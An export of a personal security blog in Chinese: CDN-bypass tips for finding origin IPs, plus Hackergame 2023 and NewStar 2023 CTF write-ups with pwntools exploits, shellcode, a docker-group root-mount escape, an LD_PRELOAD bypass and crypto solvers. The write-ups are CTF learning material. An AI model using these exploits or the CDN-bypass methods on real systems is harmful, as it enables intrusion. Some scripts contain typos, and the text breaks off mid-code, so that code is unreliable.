全球pinghttps://tools.ipip.net/cdn.php 国外请求 2配置不安全 | 域名配置上以阿里云cdn为例子 可能情况 站点test.com 运维人员在上面配置了www.test.com，那这时候cdn只会加速www.test.com，这时候直接请求test.com不会加速，可以直接访问test.com绕过, 如果子域名比如说a.test.com也是解析到同一台服务器上面的，子域名没有被加速访问子域名也可以绕过。 tips多个域名解析到同一台机器上可能会有几种情况： 1公司穷或者是业务不太大一台服务器刚刚好够用 2正向代理的情况，服务器都放在内网里面，然后做了内网穿透。 3 ddos绕过 | 优先级很低一般cdn都是按流量付费的，只要ddos把他流量打完，那cdn就没了 4 利用服务器主动请求 | 邮件服务&amp;ssrf漏洞利用服务器主动请求，一般在注册账号支持用邮箱注册，邮件服务一般都在同一台机器上，这时候利用网站发来的验证信息来判断网站真实ip，在修改密码，找回账号之类的功能点也可以。 如果网站本身存在ssrf漏洞，也可以利用ssrf来绕过，在vps上开个nc监听，这时候请求vps也能找到真实地址 5 社工 |优先级较低如果能社工到cdn平台的账号和密码，那就很简单了，不过都既然能社工到这个了，那为什么不把方向转到社工服务器终端服务账号密码上面hh 6 dns历史可能会存在一种情况，服务器前期没有配置cdn加速，后面才配置了cdn服务，这时候可以利用dns解析历史记录来绕过 12https://www.webscan.cc/http://tools.bugscaner.com/historydns.html 7备案信息可以通过查询网站备案信息来获取所在地之类的，会有些许帮助 8信息泄露_遗留文件像phpinfo 探针之类的信息泄露和前期运维的遗留文件都会暴露真实ip，通过目录扫描来查找这些文件。 9万能方法，扫全网123相关资源https://github.com/boy-hack/w8fuckcdnhttps://github.com/Tai7sy/fuckcdn","link":"/2023/09/18/cdn%E7%BB%95%E8%BF%87%E5%A4%A7%E5%85%A8tips%E6%80%9D%E8%B7%AF/"},{"title":"Hackergame2023","text":"Hackergame 启动Hackergame启动！发现校验相似度是在前端校验的，然后通过url传参相似度，传递个100过去就拿到flag了 更深更暗在main.js里有一段生成flag的代码，在控制台中调用就好了 12345async function getFlag(token) { // Generate the flag based on user's token let hash = CryptoJS.SHA256(`dEEper_@nd_d@rKer_${token}`).toString(); return `flag{T1t@n_${hash.slice(0, 32)}}`;} 123456async function getFlag(token) { // Generate the flag based on user's token let hash = CryptoJS.SHA256(`dEEper_@nd_d@rKer_${token}`).toString(); return `flag{T1t@n_${hash.slice(0, 32)}}`; }getFlag(localStorage.token) 猫咪小测123456789101112131415161718192021222324251. 想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？（30 分）12暴力破解2. 今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？（30 分）23https://arxiv.org/abs/2303.176263. 为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时应该配置好哪一条内核选项？CONFIG_TCP_CONG_BBRhttps://github.com/google/bbr/blob/master/Documentation/bbr-quick-start.md4. 🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 MyPY mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？（20 分）提示：会议的大写英文简称，比如 ISCA、CCS、ICML。ECOOPhttps://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf好耶学会怎么搜索论文了,Google hacker语法，萃取关键词，然后按时间筛选缩小范围 赛博井字棋简单玩了一下，发现怎么打都是平局，后面在想能不能在敌方棋子位置下棋，用burp suite发送了一下，发现可以，后端没有判断格子上面是否有棋子，覆盖敌方棋子后就拿到flag了，也可以用两个浏览器来操作 1flag{I_can_eat_your_pieces_41065ba433} 组委会模拟器这道题消息都是在span标签中的，只需要把span枚举一次，用正则匹配，然后再模拟点击就好了 123456789101112131415function findAndClickSpan() { const regex = /hack\\[[^\\]]*\\]/; const spans = document.getElementsByTagName('span'); Array.from(spans).forEach((span) =&gt; { if (regex.test(span.textContent)) { console.log('匹配的span元素:', span); span.click(); } });}setInterval(findAndClickSpan, 1000); 1flag{Web_pr0gra_mm1ng_5a17e089a1_15fun} 虫查询了一下无线传输图片的方法，sstv这个协议 https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485349&amp;idx=1&amp;sn=7bdfed472158dc2378113361ee9556a6&amp;chksm=fd7112e8ca069bfe1b3da839050f8bebc5c1c166ac82f3326e634779ce1f55f45897968c9922&amp;token=9197758&amp;lang=zh_CN#rd 可以用rx sstv这个软件还原图片，需要先装个虚拟声卡然后用rx sstv监听，还原就好了 1flag{SSssTV_y0u_W4NNa_HaV3_4_trY} HTTP 集邮册[差一个]1 获取第一个 flag 需要收集 5 种状态码； 1 200 get请求一个存在的目录 2 400 请求格式错误 随便乱输入一些东西 3 404 请求一个不存在的目录 4 405 Bad Request 服务器那边不支持post，直接post 12POST / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n 5 505 http版本不受支持 12GET / HTTP/10.1\\r\\nHost: example.com\\r\\n\\r\\n 2 nginx 返回首行无状态码的响应（不计入收集的状态码中）； 只要不带上http的版本号，服务器那边就不会相应状态相关的信息 12GET / \\r\\nHost: example.com\\r\\n\\r\\n 1flag{d1d you hear the HTTP packet from 1991?} 草，这个flag Git? Git!不太熟悉git，在搜索后发现，撤销这个操作本身也算是一个提交，也会记录到日志当中，然后我去翻了下项目文件，发现log文件下有一个reset的操作，这里应该是指”撤销”吧，查询了一会资料后发现有一个git show hash的命令，可以查看这个操作具体做了什么事情 12340000000000000000000000000000000000000000 15fd0a13eb46c39f34cfc0dfb4757ad23a23d026 PRO-2684 &lt;54608551+PRO-2684@users.noreply.github.com&gt; 1698306875 +0800 clone: from https://github.com/dair-ai/ML-Course-Notes.git15fd0a13eb46c39f34cfc0dfb4757ad23a23d026 505e1a3f446c23f31807a117e860f57cb5b5bb79 some_english_postgraduate &lt;some_english_postgraduate@none-exist.com&gt; 1698307060 +0800 commit: Trim trailing spaces505e1a3f446c23f31807a117e860f57cb5b5bb79 15fd0a13eb46c39f34cfc0dfb4757ad23a23d026 some_english_postgraduate &lt;some_english_postgraduate@none-exist.com&gt; 1698307092 +0800 reset: moving to HEAD~15fd0a13eb46c39f34cfc0dfb4757ad23a23d026 ea49f0cd3d36edb2965f89581b11151959d20991 some_english_postgraduate &lt;some_english_postgraduate@none-exist.com&gt; 1698307103 +0800 commit: Trim trailing spaces 1git show 505e1a3f446c23f31807a117e860f57cb5b5bb79 后找到撤销的flag 1flag{TheRe5_@lwAy5_a_R3GreT_pi1l_1n_G1t} Docker for EveryoneX 是实验室机器的管理员，为了在保证安全的同时让同学们都用上 docker，他把同学的账号加入了 docker 用户组，这样就不需要给同学 sudo 权限了！ 但果真如此吗？ 去查询了一下后发现，Docker守护程序的访问权限是没有限制的，在docker容器中，可以具有和宿主机相同的权限，那能不能把flag给搬到容器里面，查询了一下后发现有一条挂载数据卷的命令可以实现这个操作 1docker run -v /:/tmp/ -it alpine /bin/sh cat flag发现有些问题，ls -al看了下是一个软链接，进到这个链接的目录下cat flag 1/tmp/dev/shm # cat flag 得到flag 1flag{u5e_r00t1ess_conta1ner_1d94c2e3ce_plz!} JSON ⊂ YAML?第一问 根据这段话，可以分析出第一问的本质是在问yaml1.1和yaml1.2有什么区别，去学习了一下yaml，和json有些相似，由键值对，列表，还有块三种结构组合成的一种组织数据的语言。 1小 Z 听闻这番言论后当场表示怀疑，立刻说出了一个字符串，JSON 和 YAML 解析出的含义存在差异。小 W 研究了一番才发现，这是因为很多主流的 YAML 库仍然是 YAML 1.1 的，它没有这个性质。他不得不承认：「好吧，这个性质只适用于 YAML 1.2。」 https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files 可以参考这篇文章，咱的payload是 1123e100000 在yaml1.1中，这个表达式会被解析成科学计数法，json中会被解析成字符串 第二问 搜了半天，终于搜到解决方法了 1{&quot;name&quot;: &quot;John Doe&quot;, &quot;age&quot;: 25, &quot;name&quot;: &quot;Jonathan Doe&quot;} 奶奶的睡前 flag 故事咱是笨蛋，去问了newbing好久，后面用010edit打开后发现有两个iend尾，然后联想到系统都没有心思升级，截图，谷歌亲儿子这些关键词，联想到截图漏洞，尾部的像素块没有被截断 去搜索了一下发现这个网站可以还原图片 https://acropalypse.app/ 🪐 高频率星球asciinema 这个软件录制的文件，把录制的文件导出来，发现是一个js的文件，尾部显示运行这个文件能得到flag，但是录制出来的文件有太多终端颜色的符号还有切页符号 1asciienma cat xxxx &gt; output.txt 1\\033\\[[\\x30-\\x3f]*[\\x40-\\x7e] 用这个正则清理掉大多数符号后，手工清理了一下，然后拿到flag 1node output.js 1flag{y0u_cAn_ReSTorE_C0de_fr0m_asc11nema_3db2da1063300e5dabf826e40ffd016101458df23a371} 🪐 低带宽星球[差一个]压缩至 2KiB (2048 字节) 及以下、 https://github.com/meowtec/Imagine 这个项目能压缩图片到2kb以下，提交图片后获得flag 1flag{A1ot0f_t0015_is_available_to_compre55_PNG} 🪐 流式星球这道题的难点有两个，一个是不知道宽高，原始宽高不是10的倍数，以及有个随机数切片，很容易想到质因数分解，然后爆破一百次，把所有可能都试一遍，但是结果都不太行，手工试了一下，找出三个能看出规整图形的尺寸，640 * 620 1280 * 768 2560 * 1440，能看到规整图形了，发现是bang dream it’s mygo的视频，flag在字幕的位置，第二个难点是flag每帧都有随机一行被混淆，然后字体的原因flag看不太清楚，最后把相似的数字枚举了了一遍，才拿到flag 12345678910111213141516171819202122232425262728293031import cv2import numpy as npimport osdef restore_video(input_file, output_folder, frame_width, frame_height): with open(input_file, &quot;rb&quot;) as f: buffer = np.fromfile(f, dtype=np.uint8) if len(buffer) % 3 != 0: buffer = buffer[:-(len(buffer) % 3)] missing_pixels = (frame_width * frame_height * 3) - (len(buffer) % (frame_width * frame_height * 3)) buffer = np.concatenate([buffer, np.zeros(missing_pixels, dtype=np.uint8)]) frame_count = len(buffer) // (frame_width * frame_height * 3) buffer = buffer.reshape((frame_count, frame_height, frame_width, 3)) if not os.path.exists(output_folder): os.makedirs(output_folder) for i in range(frame_count): frame = buffer[i].astype(np.uint8) filename = os.path.join(output_folder, f&quot;frame_{i:04d}.png&quot;) cv2.imwrite(filename, frame)if __name__ == &quot;__main__&quot;: restore_video(&quot;video.bin&quot;, &quot;output_frames&quot;, 640, 620) 1flag{it-could-be-easy-to-restore-video-with-haruhikage-even-without-metadata-0F7968CC} 🪐 小型大语言模型星球you are smart qaq这个模型太笨了，试了好多句子才试出来了 为什么要打开 /flag 😡[差一个]好耶，在hackergame上第一个binary题 LD_PRELOAD去搜索了一下什么是ld_preload，ld_preload是linux上的一个环境变量，程序运行的时候根据ld_preload选择使用什么动态链接库 这里使用了/stage1.so 这个动态链接库 12345678910111213141516171819202122232425262728import subprocessimport base64import osSTAGE = os.environ[&quot;STAGE&quot;]assert STAGE in (&quot;1&quot;, &quot;2&quot;)if __name__ == &quot;__main__&quot;: binary = input(&quot;Base64 of binary: &quot;) with open(&quot;/dev/shm/executable&quot;, &quot;wb&quot;) as f: f.write(base64.b64decode(binary)) with open(&quot;/dev/shm/executable&quot;, &quot;rb&quot;) as f: if f.read(4) != b&quot;\\x7fELF&quot;: print(&quot;不是 ELF 文件&quot;) exit(1) os.chmod(&quot;/dev/shm/executable&quot;, 0o555) if STAGE == &quot;1&quot;: output = subprocess.run( [&quot;/dev/shm/executable&quot;], stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.PIPE, user=&quot;nobody&quot;, group=&quot;nogroup&quot;, env={ &quot;LD_PRELOAD&quot;: &quot;/stage1.so&quot; } ) 大概看了一遍stage1.so，发现和io相关的操作和io不相关但是能间接读flag的函数都被hook了，要么是return一个fake flag要么是 return 0，想了各种的方法，后面突然联想到这些io的操作本质上不就是系统调用吗，那我用内联汇编，去syscall，模拟这些读的操作不就好了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;unistd.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;int main() { int fd; ssize_t nread; char buf[1024]; // 使用系统调用打开文件 asm(&quot;syscall&quot; : &quot;=a&quot; (fd) : &quot;0&quot;(SYS_open), &quot;D&quot;(&quot;./flag&quot;), &quot;S&quot;(O_RDONLY) : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;); if (fd &lt; 0) { perror(&quot;open&quot;); return EXIT_FAILURE; } // 使用系统调用读取文件内容 asm(&quot;syscall&quot; : &quot;=a&quot; (nread) : &quot;0&quot;(SYS_read), &quot;D&quot;(fd), &quot;S&quot;(buf), &quot;d&quot;(sizeof(buf)) : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;); if (nread == -1) { perror(&quot;read&quot;); asm(&quot;syscall&quot; : : &quot;a&quot;(SYS_close), &quot;D&quot;(fd) : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;); return EXIT_FAILURE; } // 输出文件内容 fwrite(buf, 1, nread, stdout); // 使用系统调用关闭文件 asm(&quot;syscall&quot; : : &quot;a&quot;(SYS_close), &quot;D&quot;(fd) : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;); return EXIT_SUCCESS;} 得到flag 1flag{nande_ld_preload_yattano_a46091dfa1} 惜字如金咱是用枚举的方法，枚举一遍 12345678910111213141516171819202122232425262728293031323334353637383940from itertools import product# ConstantsROW1 = &quot;nymeh1niwemflcir}echaet&quot;ROW2 = &quot;a3g7}kidgojernoetlsup?h&quot;ROW3 = &quot;ulw!f5soadrhwnrsnstnoeq&quot;ROW4 = &quot;ct{l-findiehaai{oveatas&quot;ROW5 = &quot;ty9kxborszstguyd?!blm-p&quot;VOWEL = {'a', 'e', 'i', 'o', 'u'}CONSONANT = {'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '!', '?', '-', '{', '}'}TABLE = [53, 41, 85, 109, 75, 1, 33, 48, 77, 90, 17, 118, 36, 25, 13, 89, 90, 3, 63, 25, 31, 77, 27, 60, 3, 118, 24, 62, 54, 61, 25, 63, 77, 36, 5, 32, 60, 67, 113, 28]def add_variance(ori_str): variances = set() for i, c in enumerate(ori_str): if c in CONSONANT: variances.add(ori_str[:i+1] + 'e' + ori_str[i+1:]) variances.add(ori_str[:i+1] + c + ori_str[i+1:]) return list(variances)def rev_get_str(str): return ''.join(str[TABLE[i] % len(str)] for i in range(len(TABLE)))def is_format(str): return str.startswith(&quot;flag{&quot;) and str.endswith('}')rows_variances = [add_variance(ROW1), add_variance(ROW2), add_variance(ROW3), add_variance(ROW4), add_variance(ROW5)]count = 0answers = set()for variances in product(*rows_variances): s = ''.join(variances) rev = rev_get_str(s) if is_format(rev) and rev not in answers: answers.add(rev) print(rev) count += 1print(count)","link":"/2023/12/28/hackergame2023/"},{"title":"exp本地不通远程通的问题","text":"今天看一个ret2text的题目的时候，遇到了exp本地不通，远程通的奇怪问题，题目是这样的 有个backdoor函数是这样的 exp是这样的 123456789101112131415from pwn import *# p=remote(&quot;1.container.jingsai.apicon.cn&quot;,30509)elf = context.binary = ELF('./Intruduce')p = process()context.log_level='debug'payload=b'a'* (32 + 8)backd00r=0x4011B6payload+=p64(backd00r)s=p.recvline() ; print(s)print(s)char=p.recv(1)print(char)p.sendline(payload)p.interactive() gdb调试了一下发现在call system的时候卡在了这个xmm寄存器里 搜索了一下，在这里找到了解决方法 https://blog.csdn.net/fjh1997/article/details/107695261 发现是glibc &gt;= 2.27的时候 system函数里面会调用xmm寄存器，xmm寄存器要求16字节对齐，远程的环境应该是&lt;2.27的所以可以直接打通，然后我本地的glibc版本是2.35的，所以会因为xmm寄存器内存对齐的原因导致exp打不通，只需要少push一个地址，内存就对齐了 一开始我是用4011B6这个地址，后面换成了4011BB就对齐了，然后本地就通了 1234567891011121314from pwn import *# p=remote(&quot;1.container.jingsai.apicon.cn&quot;,30509)elf = context.binary = ELF('./Intruduce')p = process()context.log_level='debug'payload=b'a'* (32 + 8)backd00r=0x4011BB # old address 4011B6payload+=p64(backd00r)s=p.recvline() ; print(s)print(s)char=p.recv(1)print(char)p.sendline(payload)p.interactive()","link":"/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2023/09/18/hello-world/"},{"title":"newstar2023_week1","text":"REeasy_RE确实是打开就有 1flag{we1c0me_to_rev3rse!!} elfinputString 先异或然后+16 然后base64encode后和flag cmp，decode后-16 异或就好了 1234s1 = (char *)base64_encode(v6, v3); if ( !strcmp(s1, &quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;) ) ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ 12345678910111213141516171819_BYTE *__fastcall encode(const char *a1){ size_t v1; // rax int v2; // eax _BYTE *v4; // [rsp+20h] [rbp-20h] int i; // [rsp+28h] [rbp-18h] int v6; // [rsp+2Ch] [rbp-14h] v1 = strlen(a1); v4 = malloc(2 * v1 + 1); v6 = 0; for ( i = 0; i &lt; strlen(a1); ++i ) { v2 = v6++; v4[v2] = (a1[i] ^ 0x20) + 16; } v4[v6] = 0; return v4;} 123456789101112131415161718import base64def custom_base64_decode(encoded_str): custom_base64_chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; standard_base64_chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; translation = str.maketrans(custom_base64_chars, standard_base64_chars) return base64.b64decode(encoded_str.translate(translation))def xor(encoded_bytes): decoded_chars = [] for byte in encoded_bytes: char = chr((byte - 16) ^ 0x20) decoded_chars.append(char) return ''.join(decoded_chars)encoded_str = &quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;print(xor(custom_base64_decode(encoded_str))) 1flag{D0_4ou_7now_wha7_ELF_1s?} 咳die查壳是upx4.0.2 , 在这里下载https://github.com/upx/upx/releases 然后upx -d filename 脱壳 12345678for ( i = 0i64; ; ++i ){ v4 = &amp;Str1[strlen(Str1)]; if ( i &gt;= v4 - Str1 ) break; ++Str1[i];}if ( !strncmp(Str1, enc, v4 - Str1) ) gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~ 大概是吧str1全部++了一边 –回去就好了 12345flag = &quot;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&quot;flag = [c for c in flag]for i in range(len(flag)): flag[i] = chr(ord(flag[i]) - 1) print(flag[i] , end=&quot;&quot;) 1flag{C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1} Segmentsshift_f7 打开段视图，然后拼接flag 1flag{You_ar3_g0od_at_f1nding_ELF_segments_name} AndroXor关键逻辑在这里，能看到长度，还有异或的操作，只需要根据happyx3 还有 cArr置反就能得到inputString 12345678910111213public String Xor(String str, String str2) { char[] cArr = {14, '\\r', 17, 23, 2, 'K', 'I', '7', ' ', 30, 20, 'I', '\\n', 2, '\\f', '&gt;', '(', '@', 11, '\\'', 'K', 'Y', 25, 'A', '\\r'}; char[] cArr2 = new char[str.length()]; String str3 = str.length() != 25 ? &quot;wrong!!!&quot; : &quot;you win!!!&quot;; for (int i = 0; i &lt; str.length(); i++) { char charAt = (char) (str.charAt(i) ^ str2.charAt(i % str2.length())); cArr2[i] = charAt; if (cArr[i] != charAt) { return &quot;wrong!!!&quot;; } } return str3; } 1Toast.makeText(mainActivity, mainActivity.Xor(obj, &quot;happyx3&quot;), 1).show(); 12345str2 = &quot;happyx3&quot;cArr = [14, '\\r', 17, 23, 2, 'K', 'I', '7', ' ', 30, 20, 'I', '\\n', 2, '\\f', '&gt;', '(', '@', 11, '\\'', 'K', 'Y', 25, 'A', '\\r']str1 = ''.join([chr(cArr[i] ^ ord(str2[i % len(str2)])) if isinstance(cArr[i], int) else chr(ord(cArr[i]) ^ ord(str2[i % len(str2)])) for i in range(len(cArr))])print(str1) 1flag{3z_And0r1d_X0r_x1x1} Endian这里v5是个指针来的，一开始看有些怪，过一会就懂了。需要再异或一次，然后按字节拆分数字，小端序转大端序就好了 1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **envp){ int i; // [rsp+4h] [rbp-3Ch] char *v5; // [rsp+8h] [rbp-38h] char v6[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v7; // [rsp+38h] [rbp-8h] v7 = __readfsqword(0x28u); puts(&quot;please input your flag&quot;); __isoc99_scanf(&quot;%s&quot;, v6); v5 = v6; for ( i = 0; i &lt;= 4; ++i ) { if ( *(_DWORD *)v5 != (array[i] ^ 0x12345678) ) { printf(&quot;wrong!&quot;); exit(0); } v5 += 4; } printf(&quot;you are right&quot;); return 0;} 12345678910111213141516171819def process_and_combine(hex_values): xor_results = [hex(int(value, 16) ^ 0x12345678) for value in hex_values] reversed_strings = [] for xor_result in xor_results: xor_result = xor_result[2:].rjust(8, '0') result_string = &quot;&quot;.join([chr(int(xor_result[i:i + 2], 16)) for i in range(0, 8, 2)]) reversed_strings.append(result_string[::-1]) combined_string = &quot;&quot;.join(reversed_strings) return combined_stringflag = [&quot;75553A1E&quot;, &quot;7B583A03&quot;, &quot;4D58220C&quot;, &quot;7B50383D&quot;, &quot;736B3819&quot;]inputString = process_and_combine(flag)print(inputString) 1flag{llittl_Endian_a} EzPE修复pe头的话，找个exe 010edit从开始到0x70h那一行粘贴一下，就好了 异或置反一下就好了 123456789101112131415data = [ 0x0A, 0x0C, 0x04, 0x1F, 0x26, 0x6C, 0x43, 0x2D, 0x3C, 0x0C, 0x54, 0x4C, 0x24, 0x25, 0x11, 0x06, 0x05, 0x3A, 0x7C, 0x51, 0x38, 0x1A, 0x03, 0x0D, 0x01, 0x36, 0x1F, 0x12, 0x26, 0x04, 0x68, 0x5D, 0x3F, 0x2D, 0x37, 0x2A, 0x7D]input_recovered = [0] * len(data)input_recovered[-1] = data[-1]for i in range(len(data) - 2, -1, -1): input_recovered[i] = data[i] ^ (i ^ input_recovered[i + 1])for i in input_recovered: print(chr(i),end=&quot;&quot;) 1flag{Y0u_kn0w_what_1s_PE_File_F0rmat} lazy_activtiyactivtiy是提供用户界面，可以使用户交互的，程序中有个flag activtiy但是主界面没有什么地方能够调用这个activity的搜了一下可以用 1am start -n com.droidlearn.activity_travel/com.droidlearn.activity_travel.FlagActivity 这个命令adb shell的命令来调用一个应用的activtiy 这边是flag activity的关键逻辑，可以反编译然后将10000改成1就好了。但是折腾了好久apktools反编译打包有问题，还有签名那，后面找了一个安卓修改大师破解版，一键打包签名就正常了 1234567public void onClick(View view) { textView.setText(Integer.toString(FlagActivity.access$004(FlagActivity.this))); if (FlagActivity.this.cnt &gt;= 10000) { Toast.makeText(FlagActivity.this, editText.getText().toString(), 0).show(); } } 1flag{Act1v1ty_!s_so00oo0o_Impor#an#} pwnret2text有个backdoor函数，溢出后跳过去就好了 123456789101112131415161718192021222324from pwn import *from LibcSearcher import *elf = context.binary = ELF('./ret2text')#ip = &quot;node4.buuoj.cn&quot;port = 29750# p = process()p = remote(ip,port)line = p.recvline(); print(line) # Welcome to NewStar CTF!!line = p.recvline(); print(line) # Show me your magicbackdoor_address = 0x4011FBpayload = b'a' * (32 + 8)paylaod += backdoor_adressp.sendline(payload)p.interactive() ezshellcodeshellcode输入后会直接jmp到buf那，所以只需要把shellcode输入就好了 1234567891011121314151617181920212223242526from pwn import *from LibcSearcher import *elf = context.binary = ELF('./ezshellcode')#ip = &quot;node4.buuoj.cn&quot;port = 29750# p = process()p = remote(ip,port)context(arch='amd64', os='linux')line = p.recvline(); print(line) # Welcome to NewStar CTF!!line = p.recvline(); print(line) # Show me your magicshellcode = asm(shellcraft.sh())payload = shellcodep.sendline(payload)p.interactive() newstar shop选1进商店买到没钱然后选3 -50后，uint溢出就能直接买/bin sh了 1flag{8b42af7c-c695-489a-ad79-1bff9d84f52c} p1eee咱是笨蛋，习惯性看ida中的函数视图了，没注意到关键函数下面有个用_asm{}写的直接system bin sh的块，pie的话低三位16进制的地址是不变的，所以只需要在return位置那填充低位地址，根据原有的高位地址，就能跳过去。 12345678910.text:0000000000001264 ; __unwind {.text:0000000000001264 endbr64.text:0000000000001268 push rbp.text:0000000000001269 mov rbp, rsp.text:000000000000126C lea rdi, aBinSh ; &quot;/bin/sh&quot;.text:0000000000001273 call _system.text:0000000000001278 nop.text:0000000000001279 pop rbp.text:000000000000127A retn.text:000000000000127A ; } // starts at 1264 12345678910111213141516from pwn import *elf = context.binary = ELF('./p1eee')ip = &quot;node4.buuoj.cn&quot;port = 26886context.log_level = 'debug'# p = process()p = remote(ip,port)line = p.recvline(); print(line)payload = b'a' * (32 + 8) + p8(0x6C)p.sendline(payload)p.interactive() 1flag{cc6d8d8e-cae4-4f5d-88b5-8ddd66f66a2c} Random可以用ctypes 调用libc中的time srand rand函数，校园网好卡，去外边才打通了，要多跑几遍，随机数拼凑字符对了才可以 https://blog.csdn.net/qq_29912475/article/details/130319284 123456789101112131415161718192021222324252627from pwn import *import ctypeself = context.binary = ELF('./Random')context.log_level = 'debug'libc = ctypes.CDLL(&quot;libc.so.6&quot;)ip = &quot;node4.buuoj.cn&quot;port = 25248p = remote(ip,port)# p = process()#初始化函数返回值libc.time.restype = ctypes.c_longlibc.srand.argtypes = [ctypes.c_uint]#调用函数time_value = ctypes.c_longlong(0)seed = libc.time(ctypes.byref(time_value))libc.srand(seed)rand_result = libc.rand()line = p.recvline(); print(line)p.sendline(str(rand_result))p.interactive() 1flag{f5be13ec-f7f0-4dea-ab64-31470e102fbf} Cryptobrainfuck可以用这个解密 https://ctf.bugku.com/tool/brainfuck 1flag{Oiiaioooooiai#b7c0b1866fe58e12} Caesar’s Secert想到偏移量，凯撒密码，https://ctf.bugku.com/tool/caesar 偏移5解出flag 1flag{ca3s4r's_c1pher_i5_v4ry_3azy} Fence栅栏密码 https://www.qqxiuzi.cn/bianma/zhalanmima.php 解密 1flag{reordering_the_plaintext#686f8c03} Vigenère1234567891011121314def vigenere_decrypt_single(char_ciphertext, char_plaintext): alphabet = &quot;abcdefghijklmnopqrstuvwxyz&quot; index_ciphertext = alphabet.index(char_ciphertext) index_plaintext = alphabet.index(char_plaintext) index_key = (index_ciphertext - index_plaintext) % 26 return alphabet[index_key]ciphertext = &quot;pqcq&quot;plaintext = &quot;flag&quot;key = &quot;&quot;.join([vigenere_decrypt_single(ciphertext[i], plaintext[i]) for i in range(4)])print(key) 跑出来是kfck, 猜测是kfckfc，用kfc解密后拿到flag flag{la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0} babyrsaQ&amp;A: 1选择N = p * q是因为N有能够唯一分解成p q两个因子的特性 2为什么φ(p) =(p-1)？ 是因为p是素数这个特性，所以和p互质的数是p-1个 3 ed≡1(mod φ(N)) 这个是根据扩欧几里得推导出来的 扩欧几里得的定义是 能找到整数x ，y 使得ax + by = gcd(a,b) e和d是互质的，所以使得 ex + φ(N)y = 1 然后φ(N)y = 0，所以就算出ed≡1(mod φ(N)) http://www.factordb.com/index.php 可以用这个在线的网站分解n，然后求phi n，通过phi n求e的逆元d解密 1234567891011121314151617181920212223242526272829303132333435363738from Crypto.Util.number import long_to_bytes# 计算phi ndef calculate_phi_n(factors): phi_n = 1 for p in factors: phi_n *= (p - 1) return phi_n# 求逆元def modinv(a, m): g, x, y = extended_gcd(a, m) return x % mdef extended_gcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = extended_gcd(b % a, a) return (g, x - (b // a) * y, y)def rsa_decrypt(c, n, e, factors): phi_n = calculate_phi_n(factors) d = modinv(e, phi_n) m = pow(c, d, n) return long_to_bytes(m).decode()n = 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261e = 65537c = 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595factors = [ 2217990919, 2338725373, 2370292207, 2463878387, 2706073949, 2794985117, 2804303069, 2923072267, 2970591037, 3207148519, 3654864131, 3831680819, 3939901243, 4093178561, 4278428893]decrypted_message = rsa_decrypt(c, n, e, factors)print(decrypted_message) babyencodingpart1 和part2有=号，然后part1是大小写字母加数字，2是纯大写字母，应该是base64和32. part3搜了好久，在这篇文章中找到了https://blog.csdn.net/Retrovich/article/details/90313591 是uuencode编码，在线解密拼接得到flag 1flag{dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a} 后面去看了一下群里的crypto入门的文档，发现里面就有uuencode的识别方法 Small dMichael J. Wiener 觉得很赞 这个搜了一下，有一种针对small d的攻击方式叫维纳攻击 https://blog.csdn.net/rreally/article/details/111092579 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import gmpy2def transform(x, y): # 使用辗转相处将分数 x/y 转为连分数的形式 res = [] while y: res.append(x // y) x, y = y, x % y return resdef continued_fraction(sub_res): numerator, denominator = 1, 0 for i in sub_res[::-1]: # 从sublist的后面往前循环 